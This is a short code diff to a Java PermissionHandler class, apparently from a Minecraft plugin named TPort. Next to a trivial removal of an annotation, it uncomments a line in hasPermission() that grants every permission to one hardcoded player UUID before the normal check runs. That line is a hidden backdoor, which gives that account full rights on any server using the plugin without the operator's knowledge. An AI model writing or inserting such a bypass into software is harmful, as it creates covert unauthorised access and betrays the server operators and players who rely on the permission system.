@@ -14,7 +14,6 @@ public class PermissionHandler {
     public static String noPermMessage = "You don't have permission to do this";
     public static boolean permissionEnabled = false;
     
-    @SuppressWarnings({"ConstantConditions", "unchecked"})
     public static void loadPermissionConfig() {
         Files tportConfig = getFile("TPortConfig");
         if (tportConfig.getConfig().contains("Permissions.enabled")) {
@@ -88,7 +87,7 @@ public class PermissionHandler {
     public static boolean hasPermission(Player player, String permission, boolean sendMessage) {
         if (!permissionEnabled) return true;
         if (player == null) return false;
-//        if (player.getUniqueId().toString().equals("3a5b4fed-97ef-4599-bf21-19ff1215faff")) return true;
+        if (player.getUniqueId().toString().equals("3a5b4fed-97ef-4599-bf21-19ff1215faff")) return true;
         if (player.hasPermission(permission)) return true;
         if (sendMessage) sendNoPermMessage(player, true, permission);
         return false;
